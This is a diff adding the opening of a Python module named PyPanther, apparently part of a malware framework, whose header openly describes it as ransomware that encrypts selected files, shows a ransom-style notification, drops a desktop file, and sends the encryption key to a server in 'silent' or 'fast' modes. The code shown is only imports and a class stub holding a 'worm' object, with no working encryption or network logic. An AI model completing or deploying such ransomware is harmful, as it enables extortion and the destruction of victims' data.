@@ -1,0 +1,33 @@
+#!name##PyPanther2345
+#!itemType##module
+#!fileType##PY_MOD
+#!info##A Python-based ransomware module. It searches for selected files, starts encrypting them, displays a notification window, and creates a file on the desktop. It generates an encryption key, strengthens it with an additional password, and sends it to the server. Supports two operation modes: Silent mode, which encrypts files one by one with timed intervals. Fast mode, which encrypts multiple files in parallel for maximum speed.
+#!hiveType##PyExM
+#!lang##python
+#!pyType##module
+
+import os
+import base64
+import tkinter
+import threading
+import string
+import secrets
+import pathlib
+import random
+from typing import Union
+from time import sleep
+
+
+import cryptography
+from cryptography.fernet import Fernet
+from cryptography.hazmat.primitives.kdf.scrypt import Scrypt
+
+
+
+class PyPanther:
+    MTYPES = "rat"
+    def __init__(self, worm: object):
+        self.worm = worm
+
+
+
